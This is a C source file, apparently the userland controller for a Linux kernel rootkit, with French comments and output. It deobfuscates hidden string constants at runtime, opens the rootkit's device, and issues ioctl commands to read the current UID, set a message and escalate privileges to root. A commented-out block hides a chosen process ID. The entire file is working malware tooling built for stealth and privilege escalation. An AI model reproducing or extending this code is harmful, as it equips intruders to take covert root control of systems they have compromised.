#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"
#include "obfs.h"

int main() {

    struct rk_args args;

    DEOBFS(s_dev_rk,  _enc_dev_rk, _LEN_DEV_RK);
    DEOBFS(s_rk_cmd,  _enc_rk_cmd, _LEN_RK_CMD);
    DEOBFS(s_groot,   _enc_groot,  _LEN_GROOT);

    int fd = open(s_dev_rk, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    ioctl(fd, RK_CMD_HELLO, 0);
    /*
    printf("Entrez le PID à cacher : ");
    scanf("%lu", &pid);

    args.target = pid;
    args.value = 0;

    if (ioctl(fd, RK_CMD_HIDE_PID, &args) < 0) {
        perror("ioctl HIDE_PID");
        close(fd);
        return -1;
    }

    printf("PID %lu caché avec succès.\n", pid);
    */
    ioctl(fd, RK_CMD_GETUID, &args);
    printf("UID courant : %lu\n", args.target);

    args.target = (unsigned long)s_groot;
    args.value  = 0;
    
    ioctl(fd, RK_CMD_SET_MSG, &args);

    int rk = open(s_rk_cmd, O_RDWR | O_CREAT, 0644);
    char buf[256] = {0};
    read(rk, buf, sizeof(buf) - 1);
    printf("rk_cmd : %s\n", buf);
    close(rk);

    ioctl(fd, RK_CMD_PRIVESC, &args);                     
    printf("UID apres privesc : %d\n", getuid());

    close(fd);
    return 0;
}
